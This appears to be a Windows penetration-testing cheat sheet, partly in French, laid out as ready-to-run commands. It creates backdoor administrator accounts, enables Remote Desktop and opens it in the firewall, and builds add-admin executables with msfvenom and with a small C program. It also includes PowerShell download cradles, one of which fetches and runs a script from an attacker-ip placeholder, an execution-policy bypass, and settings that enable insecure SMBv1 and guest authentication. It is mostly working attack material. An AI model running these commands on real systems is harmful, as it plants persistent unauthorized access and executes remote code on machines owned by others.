
# Generate Malicious Executables
## Malicious cmd
### Run executable in backgroud
```
start /B program
```
### Add Admin & Enable RDP
```
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
```
## Exe builder
### MsfVenom
#### Add admin
\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
```
1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
2\. Copy the generated file, exploit.exe, to the Windows VM.
```
### GCC
Write and compile malicious exe file to add a user to the system as an admin
#### Add admin
##### Contents of adduser.c
```
#include &lt;stdlib.h&gt;

int main ()
{

	int i;

	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");

		return 0;
}
```

##### Compile adduser.c on kali
```
sudo i686-w64-mingw32-gcc adduser.c -o exploit.exe
```
# Transfer files
## Powershell
### Downloading files
In PowerShell 2.x:
```
powershell -Command '$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile("http://10.0.0.1/path/to/file","C:\path\to\file")'
```  
In PowerShell 3 and above:
```
powershell -Command 'Invoke-WebRequest -Uri "http://10.0.0.1/path/to/file" -OutFile "C:\path\to\file"'

```

### Running a Powershell Script From Command Line
Voir [Cheatsheet]( https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/powershell.rst#running-a-powershell-script-from-command-line ).
```
powershell IEX(New-Object Net.Webclient).downloadstring('http://<attacker-ip>:<attacker-port>/script.ps1')
```    
```
powershell -noexit -file "C:\path\to\script.ps1"
```    
To bypass execution policy:
```
powershell -executionPolicy bypass -noexit -file "C:\path\to\script.ps1"
```
## SMB
### Enable SMBv1 (client)

```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB1 -Type DWORD -Value   1 -Force
```
### Enable SMBv2/3 (client)
```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB2Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB2 -Type DWORD -Value   1 -Force
```
### Enable insecure guest authentication (client)
```
Set-itemproperty -name AllowInsecureGuestAuth -path "HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters" -value "1"
```
```
reg add "HKLM:\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\AllowInsecureGuestAuth" /v Restrict_Run /t REG_DWORD /d 1 /f
```